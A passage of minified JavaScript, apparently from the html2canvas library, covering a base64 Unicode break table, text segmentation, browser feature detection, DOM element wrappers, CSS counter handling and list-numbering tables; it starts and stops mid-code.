AABQAHAAcABQAFAAUABQAFAAUABwAFAAcABwAFAAcABQAFAAcABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAHAAcABQAFAAUABQAAAAAABwAHAAcABwAFAAUABwAFAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcABwAHAAUABQAFAAUABQAFAAUABQAHAAcABQAHAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUABwAFAAcABwAFAAUABQAFAAUABQAHAAUAAAAAAAAAAAAAAAAAAAAAAAcABwAFAAUABQAFAAcABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAcABwAFAAUABQAFAAUABQAFAAUABQAHAAUABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAcABwAFAAUABQAFAAAAAAAFAAUABwAHAAcABwAFAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABQAFAAUABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAFAAUABwAHAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcABQAFAAUABQAFAAUABQAAAAUABQAFAAUABQAFAAcABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUAAAAHAAUABQAFAAUABQAFAAUABwAFAAUABwAFAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAFAAUAAAAAAAAABQAAAAUABQAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAcABwAHAAcAAAAFAAUAAAAHAAcABQAHAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABwAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABQAFAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAAAAAAAAAAAAAAAAAAABQAFAAUABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUABQAAAAUABQAFAAAAAAAFAAUABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAAAAAAAAAAABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUABQAFAAUABQAAAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAFAAUABQAAAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAFAAUABQAAAAAABQAFAAUABQAFAAUABQAAAAUABQAAAAUABQAFAAUABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAUABQAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAFAAUABQAFAAUABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAFAAUABQAFAAUADgAOAA4ADgAOAA4ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAA8ADwAPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAcABwAHAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAAAAAAAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAMAAwADAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkAAAAAAAAAAAAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAAAAAAAAAAAAsADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwACwAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAAAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAOAAAAAAAAAAAADgAOAA4AAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAAAA4ADgAOAA4ADgAOAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4AAAAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4AAAAAAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAAAA4AAAAOAAAAAAAAAAAAAAAAAA4AAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAADgAAAAAAAAAAAA4AAAAOAAAAAAAAAAAADgAOAA4AAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAAAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAAAA4ADgAOAA4ADgAOAA4ADgAOAAAADgAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4AAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4ADgAOAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAOAA4ADgAOAA4AAAAAAAAAAAAAAAAAAAAAAA4ADgAOAA4ADgAOAA4ADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4AAAAOAA4ADgAOAA4ADgAAAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4ADgAOAA4AAAAAAAAAAAA="),oi=Array.isArray(ai)?function(e){for(var t=e.length,n=[],r=0;r<t;r+=4)n.push(e[r+3]<<24|e[r+2]<<16|e[r+1]<<8|e[r]);return n}(ai):new Uint32Array(ai),li=Yr(si=Array.isArray(ai)?function(e){for(var t=e.length,n=[],r=0;r<t;r+=2)n.push(e[r+1]<<8|e[r]);return n}(ai):new Uint16Array(ai),12,oi[4]/2),ci=2===oi[5]?Yr(si,(24+oi[4])/2):(ni=oi,ri=Math.ceil((24+oi[4])/4),ni.slice?ni.slice(ri,ii):new Uint32Array(Array.prototype.slice.call(ni,ri,ii))),new Jr(oi[0],oi[1],oi[2],oi[3],li,ci)),vi=function(e){return mi.get(e)},gi=function(e,t,n){var r=n-2,i=t[r],a=t[n-1],o=t[n];if(2===a&&3===o)return"×";if(2===a||3===a||4===a)return"÷";if(2===o||3===o||4===o)return"÷";if(a===pi&&-1!==[pi,hi,fi,Ai].indexOf(o))return"×";if(!(a!==fi&&a!==hi||o!==hi&&10!==o))return"×";if((a===Ai||10===a)&&10===o)return"×";if(13===o||5===o)return"×";if(7===o)return"×";if(1===a)return"×";if(13===a&&14===o){for(;5===i;)i=t[--r];if(14===i)return"×"}if(15===a&&15===o){for(var s=0;15===i;)s++,i=t[--r];if(s%2==0)return"×"}return"÷"},yi=function(e){for(var t,n=function(e){var t=function(e){for(var t=[],n=0,r=e.length;n<r;){var i=e.charCodeAt(n++);if(55296<=i&&i<=56319&&n<r){var a=e.charCodeAt(n++);56320==(64512&a)?t.push(((1023&i)<<10)+(1023&a)+65536):(t.push(i),n--)}else t.push(i)}return t}(e),n=t.length,r=0,i=0,a=t.map(vi);return{next:function(){if(n<=r)return{done:!0,value:null};for(var e="×";r<n&&"×"===(e=gi(0,a,++r)););if("×"===e&&r!==n)return{done:!0,value:null};var o=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];if(String.fromCodePoint)return String.fromCodePoint.apply(String,e);var n=e.length;if(!n)return"";for(var r=[],i=-1,a="";++i<n;){var o=e[i];o<=65535?r.push(o):(o-=65536,r.push(55296+(o>>10),o%1024+56320)),(i+1===n||16384<r.length)&&(a+=String.fromCharCode.apply(String,r),r.length=0)}return a}.apply(null,t.slice(i,r));return i=r,{value:o,done:!1}}}}(e),r=[];!(t=n.next()).done;)t.value&&r.push(t.value.slice());return r},bi=function(e){return 0===e[0]&&255===e[1]&&0===e[2]&&255===e[3]},_i=function(e,t,n,r,i){var a="http://www.w3.org/2000/svg",o=document.createElementNS(a,"svg"),s=document.createElementNS(a,"foreignObject");return o.setAttributeNS(null,"width",e.toString()),o.setAttributeNS(null,"height",t.toString()),s.setAttributeNS(null,"width","100%"),s.setAttributeNS(null,"height","100%"),s.setAttributeNS(null,"x",n.toString()),s.setAttributeNS(null,"y",r.toString()),s.setAttributeNS(null,"externalResourcesRequired","true"),o.appendChild(s),s.appendChild(i),o},wi=function(e){return new Promise((function(t,n){var r=new Image;r.onload=function(){return t(r)},r.onerror=n,r.src="data:image/svg+xml;charset=utf-8,"+encodeURIComponent((new XMLSerializer).serializeToString(e))}))},Ci={get SUPPORT_RANGE_BOUNDS(){var e=function(e){if(e.createRange){var t=e.createRange();if(t.getBoundingClientRect){var n=e.createElement("boundtest");n.style.height="123px",n.style.display="block",e.body.appendChild(n),t.selectNode(n);var r=t.getBoundingClientRect(),i=Math.round(r.height);if(e.body.removeChild(n),123===i)return!0}}return!1}(document);return Object.defineProperty(Ci,"SUPPORT_RANGE_BOUNDS",{value:e}),e},get SUPPORT_WORD_BREAKING(){var e=Ci.SUPPORT_RANGE_BOUNDS&&function(e){var t=e.createElement("boundtest");t.style.width="50px",t.style.display="block",t.style.fontSize="12px",t.style.letterSpacing="0px",t.style.wordSpacing="0px",e.body.appendChild(t);var n=e.createRange();t.innerHTML="function"==typeof"".repeat?"&#128104;".repeat(10):"";var r=t.firstChild,i=s(r.data).map((function(e){return l(e)})),a=0,o={},c=i.every((function(e,t){n.setStart(r,a),n.setEnd(r,a+e.length);var i=n.getBoundingClientRect();a+=e.length;var s=i.x>o.x||i.y>o.y;return o=i,0===t||s}));return e.body.removeChild(t),c}(document);return Object.defineProperty(Ci,"SUPPORT_WORD_BREAKING",{value:e}),e},get SUPPORT_SVG_DRAWING(){var e=function(e){var t=new Image,n=e.createElement("canvas"),r=n.getContext("2d");if(!r)return!1;t.src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'></svg>";try{r.drawImage(t,0,0),n.toDataURL()}catch(e){return!1}return!0}(document);return Object.defineProperty(Ci,"SUPPORT_SVG_DRAWING",{value:e}),e},get SUPPORT_FOREIGNOBJECT_DRAWING(){var e="function"==typeof Array.from&&"function"==typeof window.fetch?function(e){var t=e.createElement("canvas");t.width=100,t.height=100;var n=t.getContext("2d");if(!n)return Promise.reject(!1);n.fillStyle="rgb(0, 255, 0)",n.fillRect(0,0,100,100);var r=new Image,i=t.toDataURL();r.src=i;var a=_i(100,100,0,0,r);return n.fillStyle="red",n.fillRect(0,0,100,100),wi(a).then((function(t){n.drawImage(t,0,0);var r=n.getImageData(0,0,100,100).data;n.fillStyle="red",n.fillRect(0,0,100,100);var a=e.createElement("div");return a.style.backgroundImage="url("+i+")",a.style.height="100px",bi(r)?wi(_i(100,100,0,0,a)):Promise.reject(!1)})).then((function(e){return n.drawImage(e,0,0),bi(n.getImageData(0,0,100,100).data)})).catch((function(){return!1}))}(document):Promise.resolve(!1);return Object.defineProperty(Ci,"SUPPORT_FOREIGNOBJECT_DRAWING",{value:e}),e},get SUPPORT_CORS_IMAGES(){var e=void 0!==(new Image).crossOrigin;return Object.defineProperty(Ci,"SUPPORT_CORS_IMAGES",{value:e}),e},get SUPPORT_RESPONSE_TYPE(){var e="string"==typeof(new XMLHttpRequest).responseType;return Object.defineProperty(Ci,"SUPPORT_RESPONSE_TYPE",{value:e}),e},get SUPPORT_CORS_XHR(){var e="withCredentials"in new XMLHttpRequest;return Object.defineProperty(Ci,"SUPPORT_CORS_XHR",{value:e}),e}},xi=function(e,t){this.text=e,this.bounds=t},Si=function(e,t,n){var r=e.ownerDocument;if(!r)throw new Error("Node has no owner document");var i=r.createRange();return i.setStart(e,t),i.setEnd(e,t+n),i},ki=[32,160,4961,65792,65793,4153,4241],Mi=function(e,t){for(var n,r,i,a,o,c,u,d,p,h,f,A=(n=e,r={lineBreak:t.lineBreak,wordBreak:"break-word"===t.overflowWrap?"break-word":t.wordBreak},a=function(e,t){t||(t={lineBreak:"normal",wordBreak:"normal"});var n=function(e,t){void 0===t&&(t="strict");var n=[],r=[],i=[];return e.forEach((function(e,a){var o=W.get(e);if(50<o?(i.push(!0),o-=50):i.push(!1),-1!==["normal","auto","loose"].indexOf(t)&&-1!==[8208,8211,12316,12448].indexOf(e))return r.push(a),n.push(16);if(4!==o&&11!==o)return r.push(a),31===o?n.push("strict"===t?E:$):o===Q||29===o?n.push(N):43===o?131072<=e&&e<=196605||196608<=e&&e<=262141?n.push($):n.push(N):void n.push(o);if(0===a)return r.push(a),n.push(N);var s=n[a-1];return-1===J.indexOf(s)?(r.push(r[a-1]),n.push(s)):(r.push(a),n.push(N))})),[r,n,i]}(e,t.lineBreak),r=n[0],i=n[1],a=n[2];return"break-all"!==t.wordBreak&&"break-word"!==t.wordBreak||(i=i.map((function(e){return-1!==[I,N,Q].indexOf(e)?$:e}))),[r,i,"keep-all"===t.wordBreak?a.map((function(t,n){return t&&19968<=e[n]&&e[n]<=40959})):void 0]}(i=s(n),r),o=a[0],c=a[1],u=a[2],d=i.length,h=p=0,{next:function(){if(d<=h)return{done:!0,value:null};for(var e="×";h<d&&"×"===(e=re(i,c,o,++h,u)););if("×"===e&&h!==d)return{done:!0,value:null};var t=new ie(i,e,p,h);return p=h,{value:t,done:!1}}}),m=[],v=function(){if(f.value){var e=f.value.slice(),t=s(e),n="";t.forEach((function(e){-1===ki.indexOf(e)?n+=l(e):(n.length&&m.push(n),m.push(l(e)),n="")})),n.length&&m.push(n)}};!(f=A.next()).done;)v();return m},Bi=function(e,t,n){var r,i,s,l,c,u,d;this.text=Ei(t.data,n.textTransform),this.textBounds=(r=e,i=this.text,l=t,c=function(e,t){return 0!==t.letterSpacing?yi(e):Mi(e,t)}(i,s=n),u=[],d=0,c.forEach((function(e){if(s.textDecorationLine.length||0<e.trim().length)if(Ci.SUPPORT_RANGE_BOUNDS)Ci.SUPPORT_WORD_BREAKING?u.push(new xi(e,function(e,t,n,r){return a.fromClientRect(e,Si(t,n,r).getBoundingClientRect())}(r,l,d,e.length))):u.push(new xi(e,a.fromDOMRectList(r,Si(l,d,e.length).getClientRects())));else{var t=l.splitText(e.length);u.push(new xi(e,function(e,t){var n=t.ownerDocument;if(n){var r=n.createElement("html2canvaswrapper");r.appendChild(t.cloneNode(!0));var i=t.parentNode;if(i){i.replaceChild(r,t);var s=o(e,r);return r.firstChild&&i.replaceChild(r.firstChild,r),s}}return a.EMPTY}(r,l))),l=t}else Ci.SUPPORT_RANGE_BOUNDS||(l=l.splitText(e.length));d+=e.length})),u)},Ei=function(e,t){switch(t){case tr.LOWERCASE:return e.toLowerCase();case tr.CAPITALIZE:return e.replace(Ti,Pi);case tr.UPPERCASE:return e.toUpperCase();default:return e}},Ti=/(^|\s|:|-|\(|\))([a-z])/g,Pi=function(e,t,n){return 0<e.length?t+n.toUpperCase():e},Ii=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.src=n.currentSrc||n.src,r.intrinsicWidth=n.naturalWidth,r.intrinsicHeight=n.naturalHeight,r.context.cache.addImage(r.src),r}return t(n,e),n}(Wr),Fi=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.canvas=n,r.intrinsicWidth=n.width,r.intrinsicHeight=n.height,r}return t(n,e),n}(Wr),Li=function(e){function n(t,n){var r=e.call(this,t,n)||this,i=new XMLSerializer,a=o(t,n);return n.setAttribute("width",a.width+"px"),n.setAttribute("height",a.height+"px"),r.svg="data:image/svg+xml,"+encodeURIComponent(i.serializeToString(n)),r.intrinsicWidth=n.width.baseVal.value,r.intrinsicHeight=n.height.baseVal.value,r.context.cache.addImage(r.svg),r}return t(n,e),n}(Wr),Oi=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.value=n.value,r}return t(n,e),n}(Wr),Ni=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.start=n.start,r.reversed="boolean"==typeof n.reversed&&!0===n.reversed,r}return t(n,e),n}(Wr),Di=[{type:15,flags:0,unit:"px",number:3}],Ri=[{type:16,flags:0,number:50}],ji="checkbox",Ui="radio",$i=function(e){function n(t,n){var r,i,o,s=e.call(this,t,n)||this;switch(s.type=n.type.toLowerCase(),s.checked=n.checked,s.value=0===(i="password"===(r=n).type?new Array(r.value.length+1).join("•"):r.value).length?r.placeholder||"":i,s.type!==ji&&s.type!==Ui||(s.styles.backgroundColor=3739148031,s.styles.borderTopColor=s.styles.borderRightColor=s.styles.borderBottomColor=s.styles.borderLeftColor=2779096575,s.styles.borderTopWidth=s.styles.borderRightWidth=s.styles.borderBottomWidth=s.styles.borderLeftWidth=1,s.styles.borderTopStyle=s.styles.borderRightStyle=s.styles.borderBottomStyle=s.styles.borderLeftStyle=Qt.SOLID,s.styles.backgroundClip=[ut.BORDER_BOX],s.styles.backgroundOrigin=[0],s.bounds=(o=s.bounds).width>o.height?new a(o.left+(o.width-o.height)/2,o.top,o.height,o.height):o.width<o.height?new a(o.left,o.top+(o.height-o.width)/2,o.width,o.width):o),s.type){case ji:s.styles.borderTopRightRadius=s.styles.borderTopLeftRadius=s.styles.borderBottomRightRadius=s.styles.borderBottomLeftRadius=Di;break;case Ui:s.styles.borderTopRightRadius=s.styles.borderTopLeftRadius=s.styles.borderBottomRightRadius=s.styles.borderBottomLeftRadius=Ri}return s}return t(n,e),n}(Wr),zi=function(e){function n(t,n){var r=e.call(this,t,n)||this,i=n.options[n.selectedIndex||0];return r.value=i&&i.text||"",r}return t(n,e),n}(Wr),Hi=function(e){function n(t,n){var r=e.call(this,t,n)||this;return r.value=n.value,r}return t(n,e),n}(Wr),Vi=function(e){function n(t,n){var r=e.call(this,t,n)||this;r.src=n.src,r.width=parseInt(n.width,10)||0,r.height=parseInt(n.height,10)||0,r.backgroundColor=r.styles.backgroundColor;try{if(n.contentWindow&&n.contentWindow.document&&n.contentWindow.document.documentElement){r.tree=Wi(t,n.contentWindow.document.documentElement);var i=n.contentWindow.document.documentElement?ft(t,getComputedStyle(n.contentWindow.document.documentElement).backgroundColor):At.TRANSPARENT,a=n.contentWindow.document.body?ft(t,getComputedStyle(n.contentWindow.document.body).backgroundColor):At.TRANSPARENT;r.backgroundColor=it(i)?it(a)?r.styles.backgroundColor:a:i}}catch(t){}return r}return t(n,e),n}(Wr),Qi=["OL","UL","MENU"],Gi=function(e,t){return oa(t)?new Ii(e,t):aa(t)?new Fi(e,t):ra(t)?new Li(e,t):ea(t)?new Oi(e,t):ta(t)?new Ni(e,t):na(t)?new $i(e,t):ua(t)?new zi(e,t):ca(t)?new Hi(e,t):sa(t)?new Vi(e,t):new Wr(e,t)},Wi=function(e,t){var n=Gi(e,t);return n.flags|=4,function e(t,n,r,i){for(var a=n.firstChild,o=void 0;a;a=o)if(o=a.nextSibling,Xi(a)&&0<a.data.trim().length)r.textNodes.push(new Bi(t,a,r.styles));else if(Yi(a))if(da(a)&&a.assignedNodes)a.assignedNodes().forEach((function(n){return e(t,n,r,i)}));else{var s=Gi(t,a);s.styles.isVisible()&&(Ki(a,s,i)?s.flags|=4:qi(s.styles)&&(s.flags|=2),-1!==Qi.indexOf(a.tagName)&&(s.flags|=8),r.elements.push(s),a.slot,a.shadowRoot?e(t,a.shadowRoot,s,i):ca(a)||ra(a)||ua(a)||e(t,a,s,i))}}(e,t,n,n),n},Ki=function(e,t,n){return t.styles.isPositionedWithZIndex()||t.styles.opacity<1||t.styles.isTransformed()||ia(e)&&n.styles.isTransparent()},qi=function(e){return e.isPositioned()||e.isFloating()},Xi=function(e){return e.nodeType===Node.TEXT_NODE},Yi=function(e){return e.nodeType===Node.ELEMENT_NODE},Ji=function(e){return Yi(e)&&void 0!==e.style&&!Zi(e)},Zi=function(e){return"object"===_typeof2(e.className)},ea=function(e){return"LI"===e.tagName},ta=function(e){return"OL"===e.tagName},na=function(e){return"INPUT"===e.tagName},ra=function(e){return"svg"===e.tagName},ia=function(e){return"BODY"===e.tagName},aa=function(e){return"CANVAS"===e.tagName},oa=function(e){return"IMG"===e.tagName},sa=function(e){return"IFRAME"===e.tagName},la=function(e){return"STYLE"===e.tagName},ca=function(e){return"TEXTAREA"===e.tagName},ua=function(e){return"SELECT"===e.tagName},da=function(e){return"SLOT"===e.tagName},pa=function(){function e(){this.counters={}}return e.prototype.getCounterValue=function(e){var t=this.counters[e];return t&&t.length?t[t.length-1]:1},e.prototype.getCounterValues=function(e){return this.counters[e]||[]},e.prototype.pop=function(e){var t=this;e.forEach((function(e){return t.counters[e].pop()}))},e.prototype.parse=function(e){var t=this,n=e.counterIncrement,r=e.counterReset,i=!0;null!==n&&n.forEach((function(e){var n=t.counters[e.counter];n&&0!==e.increment&&(i=!1,n.length||n.push(1),n[Math.max(0,n.length-1)]+=e.increment)}));var a=[];return i&&r.forEach((function(e){var n=t.counters[e.counter];a.push(e.counter),n||(n=t.counters[e.counter]=[]),n.push(e.reset)})),a},e}(),ha={integers:[1e3,900,500,400,100,90,50,40,10,9,5,4,1],values:["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]},fa={integers:[9e3,8e3,7e3,6e3,5e3,4e3,3e3,2e3,1e3,900,800,700,600,500,400,300,200,100,90,80,70,60,50,40,30,20,10,9,8,7,6,5,4,3,2,1],values:["Ք","Փ","Ւ","Ց","Ր","Տ","Վ","Ս","Ռ","Ջ","Պ","Չ","Ո","Շ","Ն","Յ","Մ","Ճ","Ղ","Ձ","Հ","Կ","Ծ","Խ","Լ","Ի","Ժ","Թ","Ը","Է","Զ","Ե","Դ","Գ","Բ","Ա"]},Aa={integers:[1e4,9e3,8e3,7e3,6e3,5e3,4e3,3e3,2e3,1e3,400,300,200,100,90,80,70,60,50,40,30,20,19,18,17,16,15,10,9,8,7,6,5,4,3,2,1],values:["י׳","ט׳","ח׳","ז׳","ו׳","ה׳","ד׳","ג׳","ב׳","א׳","ת","ש","ר","ק","צ","פ","ע","ס","נ","מ","ל","כ","יט","יח","יז","טז","טו","י","ט","ח","ז","ו","ה","ד","ג","ב","א"]},ma={integers:[1e4,9e3,8e3,7e3,6e3,5e3,4e3,3e3,2e3,1e3,900,800,700,600,500,400,300,200,100,90,80,70,60,50,40,30,20,10,9,8,7,6,5,4,3,2,1],values:["ჵ","ჰ","ჯ","ჴ","ხ","ჭ","წ","ძ","ც","ჩ","შ","ყ","ღ","ქ","ფ","ჳ","ტ","ს","რ","ჟ","პ","ო","ჲ","ნ","მ","ლ","კ","ი","თ","ჱ","ზ","ვ","ე","დ","გ","ბ","ა"]},va=function(e,t,n,r,i,a){return e<t||n<e?wa(e,i,0<a.length):r.integers.reduce((function(t,n,i){for(;n<=e;)e-=n,t+=r.values[i];return t}),"")+a},ga=function(e,t,n,r){for(var i="";n||e--,i=r(e)+i,t<=(e/=t)*t;);return i},ya=function(e,t,n,r,i){var 